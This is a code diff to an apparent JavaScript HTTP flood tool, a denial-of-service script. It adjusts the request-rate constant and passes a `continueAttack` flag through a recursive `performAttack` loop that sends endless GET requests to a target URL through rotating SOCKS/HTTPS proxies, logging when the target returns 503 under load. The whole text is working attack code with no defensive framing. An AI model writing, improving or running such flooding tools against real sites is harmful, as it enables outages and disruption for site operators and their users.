@@ -68,7 +68,7 @@ const acceptHeaders = [
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000000;
+const requestsPerSecond = 1000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -81,7 +81,7 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, headers, onComplete) => {
+const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     if (!continueAttack) return;
 
     axios.get(url, {
@@ -89,7 +89,7 @@ const performAttack = (url, agent, headers, onComplete) => {
         headers,
         timeout: 0
     })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, onComplete), 0))
+    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
             console.log("Target under heavy load (503).");
@@ -98,7 +98,7 @@ const performAttack = (url, agent, headers, onComplete) => {
         } else {
             console.log("Request error: " + err.message);
         }
-        setTimeout(() => performAttack(url, agent, headers, onComplete), 0);
+        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
     });
 };
 
@@ -148,7 +148,7 @@ module.exports["run"] = async ({
             ? new SocksProxyAgent(proxyUrl)
             : new HttpsProxyAgent(proxyUrl);
 
-        performAttack(targetUrl, agent, headers, () => {
+        performAttack(targetUrl, agent, headers, continueAttack, () => {
             if (!continueAttack) {
                 clearTimeout(attackTimeout);
             }
